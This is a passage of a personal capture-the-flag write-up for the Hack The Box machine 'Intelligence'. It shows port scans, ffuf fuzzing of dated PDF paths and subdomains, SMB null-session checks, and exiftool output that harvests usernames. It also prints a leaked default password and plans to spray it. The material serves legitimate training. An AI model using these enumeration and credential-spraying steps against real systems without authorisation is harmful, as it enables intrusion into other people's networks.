---
{"dg-publish":true,"permalink":"/ct-fs/htb/intelligence/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #web #AD #fuzzing #spraying #Responder #scripting #leaked_creds #GMSA #constrained_delegation

## Recon
![Pasted image 20260909104023.png](/img/user/Pasted%20image%2020260909104023.png)

### Nmap:
```zsh
Enter your target IP address or URL here: 10.129.95.154
------------------------------------------------------------
Scanning target 10.129.95.154
Time started: 2026-09-09 13:34:20.006662
------------------------------------------------------------
Port 53 is open
Port 139 is open
Port 80 is open
Port 135 is open
Port 88 is open
Port 389 is open
Port 445 is open
Port 464 is open
Port 593 is open
Port 636 is open
Port 3269 is open
Port 3268 is open
Port 9389 is open
Port 49685 is open
Port 49667 is open
Port 49686 is open
Port 49709 is open
Port 49706 is open
Port scan completed in 0:01:38.984123
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p53,139,80,135,88,389,445,464,593,636,3269,3268,9389,49685,49667,49686,49709,49706 -sV -sC -T4 -Pn -oA 10.129.95.154 10.129.95.154
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p53,139,80,135,88,389,445,464,593,636,3269,3268,9389,49685,49667,49686,49709,49706 -sV -sC -T4 -Pn -oA 10.129.95.154 10.129.95.154
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 13:36 -0400
Nmap scan report for 10.129.95.154
Host is up (0.090s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-09-10 00:36:25Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49685/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc             Microsoft Windows RPC
49706/tcp open  msrpc             Microsoft Windows RPC
49709/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m03s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-10T00:37:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.94 seconds
```
Initial portscans reveal the common suite of windows ports and a webserver up on port 80. Adding `intelligence.htb` to my `/etc/hosts` file.
### Port 80 (Webserver)
![Pasted image 20260909104128.png](/img/user/Pasted%20image%2020260909104128.png)
Visiting port 80 in the browser reveals a pretty stock web server.

![Pasted image 20260909111126.png](/img/user/Pasted%20image%2020260909111126.png)
Scrolling further we see links for two different apparent documents

![Pasted image 20260909111331.png](/img/user/Pasted%20image%2020260909111331.png)
Clicking through we see uploads of Lorem Ipsum as PDFs that are named with a date and `-upload.pdf`. Manually enumerating the dates we see that there are entries for many days in the year 2020. We can fuzz this to find all valid PDFs.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/scanning]
└─$ for i in {1..12}; do echo $i >> mon.txt; done                                       
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/scanning]
└─$ cat mon.txt 
1
2
3
4
5
6
7
8
9
10
11
12

┌──(kali㉿kali)-[~/CTF/HTB/intelligence/scanning]
└─$ for i in {00..31}; do echo $i >> num.txt; done
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/scanning]
└─$ cat num.txt
00
01
02
03
04
05
06
07
08
09
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
```
To begin, we generate two wordlists representing the total number of days in a given month and the total number of months in year.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/scanning]
└─$ ffuf -c -v -w ./num.txt:DAY -w ./mon.txt:MON -u http://intelligence.htb/documents/2020-MON-DAY-upload.pdf

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://intelligence.htb/documents/2020-MON-DAY-upload.pdf
 :: Wordlist         : DAY: /home/kali/CTF/HTB/intelligence/scanning/num.txt
 :: Wordlist         : MON: /home/kali/CTF/HTB/intelligence/scanning/mon.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 11248, Words: 162, Lines: 127, Duration: 109ms]
| URL | http://intelligence.htb/documents/2020-10-05-upload.pdf
    * DAY: 05
    * MON: 10

[Status: 200, Size: 11074, Words: 153, Lines: 134, Duration: 97ms]
| URL | http://intelligence.htb/documents/2020-11-13-upload.pdf
    * DAY: 13
    * MON: 11

[Status: 200, Size: 27196, Words: 244, Lines: 213, Duration: 105ms]
| URL | http://intelligence.htb/documents/2020-10-19-upload.pdf
    * DAY: 19
    * MON: 10

[Status: 200, Size: 11412, Words: 151, Lines: 133, Duration: 95ms]
| URL | http://intelligence.htb/documents/2020-11-24-upload.pdf
    * DAY: 24
    * MON: 11

[Status: 200, Size: 25568, Words: 222, Lines: 186, Duration: 100ms]
| URL | http://intelligence.htb/documents/2020-11-03-upload.pdf
    * DAY: 03
    * MON: 11

[Status: 200, Size: 26599, Words: 237, Lines: 186, Duration: 97ms]
| URL | http://intelligence.htb/documents/2020-11-01-upload.pdf
    * DAY: 01
    * MON: 11

[Status: 200, Size: 25964, Words: 251, Lines: 220, Duration: 103ms]
| URL | http://intelligence.htb/documents/2020-11-06-upload.pdf
    * DAY: 06
    * MON: 11

[Status: 200, Size: 25472, Words: 229, Lines: 216, Duration: 103ms]
| URL | http://intelligence.htb/documents/2020-11-10-upload.pdf
    * DAY: 10
    * MON: 11

[Status: 200, Size: 11902, Words: 163, Lines: 137, Duration: 96ms]
| URL | http://intelligence.htb/documents/2020-12-20-upload.pdf
    * DAY: 20
    * MON: 12

[Status: 200, Size: 26461, Words: 226, Lines: 206, Duration: 105ms]
| URL | http://intelligence.htb/documents/2020-11-11-upload.pdf
    * DAY: 11
    * MON: 11

[Status: 200, Size: 27286, Words: 252, Lines: 207, Duration: 99ms]
| URL | http://intelligence.htb/documents/2020-11-30-upload.pdf
    * DAY: 30
    * MON: 11

[Status: 200, Size: 26825, Words: 234, Lines: 209, Duration: 102ms]
| URL | http://intelligence.htb/documents/2020-12-24-upload.pdf
    * DAY: 24
    * MON: 12

[Status: 200, Size: 11480, Words: 164, Lines: 127, Duration: 111ms]
| URL | http://intelligence.htb/documents/2020-12-28-upload.pdf
    * DAY: 28
    * MON: 12

[Status: 200, Size: 25109, Words: 218, Lines: 191, Duration: 111ms]
| URL | http://intelligence.htb/documents/2020-12-30-upload.pdf
    * DAY: 30
    * MON: 12

[Status: 200, Size: 26762, Words: 224, Lines: 200, Duration: 100ms]
| URL | http://intelligence.htb/documents/2020-12-10-upload.pdf
    * DAY: 10
    * MON: 12

[Status: 200, Size: 27242, Words: 242, Lines: 210, Duration: 101ms]
| URL | http://intelligence.htb/documents/2020-12-15-upload.pdf
    * DAY: 15
    * MON: 12

:: Progress: [384/384] :: Job [1/1] :: 353 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```
We then use `ffuf` with custom variable names for each list `MON` and `DAY` respectively to fuzz all entries for the year 2020 from every month in that year. This was our output. It gave us 16 different PDFs.

![Pasted image 20260909112607.png](/img/user/Pasted%20image%2020260909112607.png)
Visiting every result in the browser revealed to be Lorem Ipsum except for `http://intelligence.htb/documents/2020-12-30-upload.pdf` which gave us a very brief but verbose "Internal IT update" where a user `Ted` has a script in place to notify them of web outages and that the department has yet to lockdown all of their service accounts. This could be very useful for us.

After several headscratching hours I decided to reformat the months file so that they'll all be two digit lengths and got this output:

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/scanning]
└─$ ffuf -c -v -w ./num.txt:DAY -w ./mon.txt:MON -u http://intelligence.htb/documents/2020-MON-DAY-upload.pdf

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://intelligence.htb/documents/2020-MON-DAY-upload.pdf
 :: Wordlist         : DAY: /home/kali/CTF/HTB/intelligence/scanning/num.txt
 :: Wordlist         : MON: /home/kali/CTF/HTB/intelligence/scanning/mon.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 11557, Words: 167, Lines: 136, Duration: 118ms]
| URL | http://intelligence.htb/documents/2020-01-23-upload.pdf
    * DAY: 23
    * MON: 01

[Status: 200, Size: 11632, Words: 157, Lines: 127, Duration: 117ms]
| URL | http://intelligence.htb/documents/2020-01-20-upload.pdf
    * DAY: 20
    * MON: 01

[Status: 200, Size: 26835, Words: 241, Lines: 209, Duration: 105ms]
| URL | http://intelligence.htb/documents/2020-01-01-upload.pdf
    * DAY: 01
    * MON: 01

[Status: 200, Size: 11228, Words: 167, Lines: 132, Duration: 96ms]
| URL | http://intelligence.htb/documents/2020-02-17-upload.pdf
    * DAY: 17
    * MON: 02

[Status: 200, Size: 26400, Words: 232, Lines: 205, Duration: 111ms]
| URL | http://intelligence.htb/documents/2020-01-10-upload.pdf
    * DAY: 10
    * MON: 01

[Status: 200, Size: 11543, Words: 167, Lines: 131, Duration: 96ms]
| URL | http://intelligence.htb/documents/2020-02-28-upload.pdf
    * DAY: 28
    * MON: 02

[Status: 200, Size: 27522, Words: 223, Lines: 196, Duration: 120ms]
| URL | http://intelligence.htb/documents/2020-01-04-upload.pdf
    * DAY: 04
    * MON: 01

[Status: 200, Size: 27002, Words: 229, Lines: 199, Duration: 122ms]
| URL | http://intelligence.htb/documents/2020-01-02-upload.pdf
    * DAY: 02
    * MON: 01

[Status: 200, Size: 26252, Words: 225, Lines: 193, Duration: 118ms]
| URL | http://intelligence.htb/documents/2020-01-25-upload.pdf
    * DAY: 25
    * MON: 01

[Status: 200, Size: 26706, Words: 242, Lines: 193, Duration: 124ms]
| URL | http://intelligence.htb/documents/2020-01-30-upload.pdf
    * DAY: 30
    * MON: 01

[Status: 200, Size: 28637, Words: 236, Lines: 224, Duration: 125ms]
| URL | http://intelligence.htb/documents/2020-01-22-upload.pdf
    * DAY: 22
    * MON: 01

[Status: 200, Size: 25245, Words: 241, Lines: 198, Duration: 99ms]
| URL | http://intelligence.htb/documents/2020-02-11-upload.pdf
    * DAY: 11
    * MON: 02

[Status: 200, Size: 27378, Words: 247, Lines: 213, Duration: 95ms]
| URL | http://intelligence.htb/documents/2020-02-23-upload.pdf
    * DAY: 23
    * MON: 02

[Status: 200, Size: 11250, Words: 157, Lines: 134, Duration: 103ms]
| URL | http://intelligence.htb/documents/2020-03-21-upload.pdf
    * DAY: 21
    * MON: 03

[Status: 200, Size: 27332, Words: 237, Lines: 206, Duration: 103ms]
| URL | http://intelligence.htb/documents/2020-02-24-upload.pdf
    * DAY: 24
    * MON: 02

[Status: 200, Size: 26194, Words: 235, Lines: 202, Duration: 102ms]
| URL | http://intelligence.htb/documents/2020-03-04-upload.pdf
    * DAY: 04
    * MON: 03

[Status: 200, Size: 26124, Words: 221, Lines: 205, Duration: 104ms]
| URL | http://intelligence.htb/documents/2020-03-05-upload.pdf
    * DAY: 05
    * MON: 03

[Status: 200, Size: 11466, Words: 156, Lines: 134, Duration: 108ms]
| URL | http://intelligence.htb/documents/2020-04-02-upload.pdf
    * DAY: 02
    * MON: 04

[Status: 200, Size: 24888, Words: 213, Lines: 204, Duration: 102ms]
| URL | http://intelligence.htb/documents/2020-03-13-upload.pdf
    * DAY: 13
    * MON: 03

[Status: 200, Size: 27227, Words: 221, Lines: 210, Duration: 103ms]
| URL | http://intelligence.htb/documents/2020-03-17-upload.pdf
    * DAY: 17
    * MON: 03

[Status: 200, Size: 27143, Words: 233, Lines: 213, Duration: 102ms]
| URL | http://intelligence.htb/documents/2020-03-12-upload.pdf
    * DAY: 12
    * MON: 03

[Status: 200, Size: 24865, Words: 224, Lines: 212, Duration: 101ms]
| URL | http://intelligence.htb/documents/2020-04-23-upload.pdf
    * DAY: 23
    * MON: 04

[Status: 200, Size: 27949, Words: 226, Lines: 208, Duration: 111ms]
| URL | http://intelligence.htb/documents/2020-04-04-upload.pdf
    * DAY: 04
    * MON: 04

[Status: 200, Size: 27244, Words: 243, Lines: 207, Duration: 96ms]
| URL | http://intelligence.htb/documents/2020-05-11-upload.pdf
    * DAY: 11
    * MON: 05

[Status: 200, Size: 26689, Words: 227, Lines: 212, Duration: 102ms]
| URL | http://intelligence.htb/documents/2020-04-15-upload.pdf
    * DAY: 15
    * MON: 04

[Status: 200, Size: 27480, Words: 215, Lines: 200, Duration: 100ms]
| URL | http://intelligence.htb/documents/2020-05-20-upload.pdf
    * DAY: 20
    * MON: 05

[Status: 200, Size: 11532, Words: 159, Lines: 132, Duration: 104ms]
| URL | http://intelligence.htb/documents/2020-05-29-upload.pdf
    * DAY: 29
    * MON: 05

[Status: 200, Size: 26093, Words: 233, Lines: 208, Duration: 101ms]
| URL | http://intelligence.htb/documents/2020-05-03-upload.pdf
    * DAY: 03
    * MON: 05

[Status: 200, Size: 11381, Words: 160, Lines: 136, Duration: 103ms]
| URL | http://intelligence.htb/documents/2020-06-03-upload.pdf
    * DAY: 03
    * MON: 06

[Status: 200, Size: 11857, Words: 174, Lines: 149, Duration: 113ms]
| URL | http://intelligence.htb/documents/2020-05-24-upload.pdf
    * DAY: 24
    * MON: 05

[Status: 200, Size: 28228, Words: 237, Lines: 194, Duration: 102ms]
| URL | http://intelligence.htb/documents/2020-05-01-upload.pdf
    * DAY: 01
    * MON: 05

[Status: 200, Size: 11540, Words: 165, Lines: 135, Duration: 103ms]
| URL | http://intelligence.htb/documents/2020-06-08-upload.pdf
    * DAY: 08
    * MON: 06

[Status: 200, Size: 27797, Words: 236, Lines: 212, Duration: 105ms]
| URL | http://intelligence.htb/documents/2020-06-02-upload.pdf
    * DAY: 02
    * MON: 06

[Status: 200, Size: 27937, Words: 240, Lines: 217, Duration: 102ms]
| URL | http://intelligence.htb/documents/2020-06-07-upload.pdf
    * DAY: 07
    * MON: 06

[Status: 200, Size: 26062, Words: 225, Lines: 183, Duration: 99ms]
| URL | http://intelligence.htb/documents/2020-05-07-upload.pdf
    * DAY: 07
    * MON: 05

[Status: 200, Size: 26443, Words: 236, Lines: 186, Duration: 100ms]
| URL | http://intelligence.htb/documents/2020-06-14-upload.pdf
    * DAY: 14
    * MON: 06

[Status: 200, Size: 27121, Words: 245, Lines: 206, Duration: 102ms]
| URL | http://intelligence.htb/documents/2020-06-15-upload.pdf
    * DAY: 15
    * MON: 06

[Status: 200, Size: 11575, Words: 159, Lines: 128, Duration: 105ms]
| URL | http://intelligence.htb/documents/2020-06-12-upload.pdf
    * DAY: 12
    * MON: 06

[Status: 200, Size: 26448, Words: 239, Lines: 207, Duration: 93ms]
| URL | http://intelligence.htb/documents/2020-05-17-upload.pdf
    * DAY: 17
    * MON: 05

[Status: 200, Size: 26278, Words: 239, Lines: 207, Duration: 95ms]
| URL | http://intelligence.htb/documents/2020-06-22-upload.pdf
    * DAY: 22
    * MON: 06

[Status: 200, Size: 26255, Words: 251, Lines: 194, Duration: 102ms]
| URL | http://intelligence.htb/documents/2020-05-21-upload.pdf
    * DAY: 21
    * MON: 05

[Status: 200, Size: 10662, Words: 157, Lines: 142, Duration: 95ms]
| URL | http://intelligence.htb/documents/2020-06-25-upload.pdf
    * DAY: 25
    * MON: 06

[Status: 200, Size: 26922, Words: 222, Lines: 220, Duration: 105ms]
| URL | http://intelligence.htb/documents/2020-06-04-upload.pdf
    * DAY: 04
    * MON: 06

[Status: 200, Size: 27320, Words: 236, Lines: 202, Duration: 99ms]
| URL | http://intelligence.htb/documents/2020-07-02-upload.pdf
    * DAY: 02
    * MON: 07

[Status: 200, Size: 11910, Words: 167, Lines: 141, Duration: 100ms]
| URL | http://intelligence.htb/documents/2020-07-08-upload.pdf
    * DAY: 08
    * MON: 07

[Status: 200, Size: 24966, Words: 217, Lines: 183, Duration: 99ms]
| URL | http://intelligence.htb/documents/2020-07-06-upload.pdf
    * DAY: 06
    * MON: 07

[Status: 200, Size: 12100, Words: 162, Lines: 138, Duration: 98ms]
| URL | http://intelligence.htb/documents/2020-07-20-upload.pdf
    * DAY: 20
    * MON: 07

[Status: 200, Size: 26321, Words: 211, Lines: 207, Duration: 94ms]
| URL | http://intelligence.htb/documents/2020-07-24-upload.pdf
    * DAY: 24
    * MON: 07

[Status: 200, Size: 26060, Words: 246, Lines: 210, Duration: 88ms]
| URL | http://intelligence.htb/documents/2020-06-21-upload.pdf
    * DAY: 21
    * MON: 06

[Status: 200, Size: 26390, Words: 216, Lines: 208, Duration: 96ms]
| URL | http://intelligence.htb/documents/2020-06-28-upload.pdf
    * DAY: 28
    * MON: 06

[Status: 200, Size: 27338, Words: 236, Lines: 205, Duration: 97ms]
| URL | http://intelligence.htb/documents/2020-06-26-upload.pdf
    * DAY: 26
    * MON: 06

[Status: 200, Size: 27038, Words: 228, Lines: 205, Duration: 96ms]
| URL | http://intelligence.htb/documents/2020-08-01-upload.pdf
    * DAY: 01
    * MON: 08

[Status: 200, Size: 25634, Words: 234, Lines: 194, Duration: 100ms]
| URL | http://intelligence.htb/documents/2020-06-30-upload.pdf
    * DAY: 30
    * MON: 06

[Status: 200, Size: 11611, Words: 161, Lines: 144, Duration: 101ms]
| URL | http://intelligence.htb/documents/2020-08-09-upload.pdf
    * DAY: 09
    * MON: 08

[Status: 200, Size: 26885, Words: 231, Lines: 214, Duration: 97ms]
| URL | http://intelligence.htb/documents/2020-08-19-upload.pdf
    * DAY: 19
    * MON: 08

[Status: 200, Size: 10711, Words: 171, Lines: 133, Duration: 96ms]
| URL | http://intelligence.htb/documents/2020-08-20-upload.pdf
    * DAY: 20
    * MON: 08

[Status: 200, Size: 27148, Words: 215, Lines: 203, Duration: 99ms]
| URL | http://intelligence.htb/documents/2020-09-02-upload.pdf
    * DAY: 02
    * MON: 09

[Status: 200, Size: 26986, Words: 245, Lines: 194, Duration: 97ms]
| URL | http://intelligence.htb/documents/2020-09-04-upload.pdf
    * DAY: 04
    * MON: 09

[Status: 200, Size: 25551, Words: 238, Lines: 193, Duration: 96ms]
| URL | http://intelligence.htb/documents/2020-09-06-upload.pdf
    * DAY: 06
    * MON: 09

[Status: 200, Size: 26417, Words: 210, Lines: 193, Duration: 99ms]
| URL | http://intelligence.htb/documents/2020-09-05-upload.pdf
    * DAY: 05
    * MON: 09

[Status: 200, Size: 25405, Words: 247, Lines: 189, Duration: 105ms]
| URL | http://intelligence.htb/documents/2020-08-03-upload.pdf
    * DAY: 03
    * MON: 08

[Status: 200, Size: 12098, Words: 156, Lines: 146, Duration: 109ms]
| URL | http://intelligence.htb/documents/2020-09-11-upload.pdf
    * DAY: 11
    * MON: 09

[Status: 200, Size: 26521, Words: 219, Lines: 212, Duration: 110ms]
| URL | http://intelligence.htb/documents/2020-09-13-upload.pdf
    * DAY: 13
    * MON: 09

[Status: 200, Size: 26959, Words: 236, Lines: 207, Duration: 108ms]
| URL | http://intelligence.htb/documents/2020-09-16-upload.pdf
    * DAY: 16
    * MON: 09

[Status: 200, Size: 25072, Words: 225, Lines: 194, Duration: 107ms]
| URL | http://intelligence.htb/documents/2020-09-22-upload.pdf
    * DAY: 22
    * MON: 09

[Status: 200, Size: 26080, Words: 244, Lines: 197, Duration: 103ms]
| URL | http://intelligence.htb/documents/2020-09-30-upload.pdf
    * DAY: 30
    * MON: 09

[Status: 200, Size: 26809, Words: 248, Lines: 227, Duration: 104ms]
| URL | http://intelligence.htb/documents/2020-09-27-upload.pdf
    * DAY: 27
    * MON: 09

[Status: 200, Size: 11248, Words: 162, Lines: 127, Duration: 95ms]
| URL | http://intelligence.htb/documents/2020-10-05-upload.pdf
    * DAY: 05
    * MON: 10

[Status: 200, Size: 24586, Words: 228, Lines: 221, Duration: 104ms]
| URL | http://intelligence.htb/documents/2020-09-29-upload.pdf
    * DAY: 29
    * MON: 09

[Status: 200, Size: 27196, Words: 244, Lines: 213, Duration: 100ms]
| URL | http://intelligence.htb/documents/2020-10-19-upload.pdf
    * DAY: 19
    * MON: 10

[Status: 200, Size: 26599, Words: 237, Lines: 186, Duration: 99ms]
| URL | http://intelligence.htb/documents/2020-11-01-upload.pdf
    * DAY: 01
    * MON: 11

[Status: 200, Size: 25568, Words: 222, Lines: 186, Duration: 102ms]
| URL | http://intelligence.htb/documents/2020-11-03-upload.pdf
    * DAY: 03
    * MON: 11

[Status: 200, Size: 25964, Words: 251, Lines: 220, Duration: 101ms]
| URL | http://intelligence.htb/documents/2020-11-06-upload.pdf
    * DAY: 06
    * MON: 11

[Status: 200, Size: 25472, Words: 229, Lines: 216, Duration: 101ms]
| URL | http://intelligence.htb/documents/2020-11-10-upload.pdf
    * DAY: 10
    * MON: 11

[Status: 200, Size: 11074, Words: 153, Lines: 134, Duration: 92ms]
| URL | http://intelligence.htb/documents/2020-11-13-upload.pdf
    * DAY: 13
    * MON: 11

[Status: 200, Size: 11412, Words: 151, Lines: 133, Duration: 96ms]
| URL | http://intelligence.htb/documents/2020-11-24-upload.pdf
    * DAY: 24
    * MON: 11

[Status: 200, Size: 26461, Words: 226, Lines: 206, Duration: 101ms]
| URL | http://intelligence.htb/documents/2020-11-11-upload.pdf
    * DAY: 11
    * MON: 11

[Status: 200, Size: 27286, Words: 252, Lines: 207, Duration: 94ms]
| URL | http://intelligence.htb/documents/2020-11-30-upload.pdf
    * DAY: 30
    * MON: 11

[Status: 200, Size: 26762, Words: 224, Lines: 200, Duration: 95ms]
| URL | http://intelligence.htb/documents/2020-12-10-upload.pdf
    * DAY: 10
    * MON: 12

[Status: 200, Size: 27242, Words: 242, Lines: 210, Duration: 97ms]
| URL | http://intelligence.htb/documents/2020-12-15-upload.pdf
    * DAY: 15
    * MON: 12

[Status: 200, Size: 11902, Words: 163, Lines: 137, Duration: 96ms]
| URL | http://intelligence.htb/documents/2020-12-20-upload.pdf
    * DAY: 20
    * MON: 12

[Status: 200, Size: 26825, Words: 234, Lines: 209, Duration: 105ms]
| URL | http://intelligence.htb/documents/2020-12-24-upload.pdf
    * DAY: 24
    * MON: 12

[Status: 200, Size: 11480, Words: 164, Lines: 127, Duration: 101ms]
| URL | http://intelligence.htb/documents/2020-12-28-upload.pdf
    * DAY: 28
    * MON: 12

[Status: 200, Size: 25109, Words: 218, Lines: 191, Duration: 92ms]
| URL | http://intelligence.htb/documents/2020-12-30-upload.pdf
    * DAY: 30
    * MON: 12

:: Progress: [384/384] :: Job [1/1] :: 406 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

```

![Pasted image 20260910133208.png](/img/user/Pasted%20image%2020260910133208.png)
We finally come across another blog entry from 6/4/2020 that's not lorem ipsum and it has a default credential for all new users: `NewIntelligenceCorpUser9876`. Let's try authenticating as `Ted` with the default creds.

No dice. See [[CTFs/HTB/Intelligence#Initial Access\|#Initial Access]] for more.

#### Subdomain/Vhost Enumeration
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/scanning]
└─$ ffuf -c -v -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.intelligence.htb

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.intelligence.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [114442/114442] :: Job [1/1] :: 126 req/sec :: Duration: [0:04:01] :: Errors: 114442 ::

┌──(kali㉿kali)-[~/CTF/HTB/intelligence/scanning]
└─$ ffuf -c -v -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.intelligence.htb" -u http://intelligence.htb -fs 7432

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://intelligence.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.intelligence.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7432
________________________________________________

:: Progress: [114442/114442] :: Job [1/1] :: 430 req/sec :: Duration: [0:04:43] :: Errors: 0 :
```


### Port 445 (SMB) (unauthenticated)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/scanning]
└─$ nxc smb intelligence.htb -u '' -p '' --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\: 
SMB         10.129.95.154   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/intelligence/scanning]
└─$ nxc smb intelligence.htb -u 'Guest' -p '' --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Guest: STATUS_ACCOUNT_DISABLED
```
Banner grabbing and enumerating null and Guest share access reveals this machine is running Windows 10 / Server 2019 Build 17763 x64 with the hostname `DC.intelligence.htb`.



## Initial Access
### Leaked credentials
![Pasted image 20260910134721.png](/img/user/Pasted%20image%2020260910134721.png)
Running `exiftool` on the IT update pdf we see it was made by user `Jason.Patterson`.

```zsh
======== ./2020-06-07-upload.pdf
ExifTool Version Number         : 13.55
File Name                       : 2020-06-07-upload.pdf
Directory                       : .
File Size                       : 28 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2026:09:10 16:55:12-04:00
File Inode Change Date/Time     : 2026:09:10 16:55:12-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Thomas.Valenzuela
======== ./2020-06-08-upload.pdf
ExifTool Version Number         : 13.55
File Name                       : 2020-06-08-upload.pdf
Directory                       : .
File Size                       : 12 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2026:09:10 16:55:10-04:00
File Inode Change Date/Time     : 2026:09:10 16:55:10-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : David.Mcbride
======== ./2020-06-12-upload.pdf
ExifTool Version Number         : 13.55
File Name                       : 2020-06-12-upload.pdf
Directory                       : .
File Size                       : 12 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2026:09:10 16:55:10-04:00
File Inode Change Date/Time     : 2026:09:10 16:55:10-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Darryl.Harris
======== ./2020-06-14-upload.pdf
ExifTool Version Number         : 13.55
File Name                       : 2020-06-14-upload.pdf
Directory                       : .
File Size                       : 26 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2026:09:10 16:55:11-04:00
File Inode Change Date/Time     : 2026:09:10 16:55:11-04:00
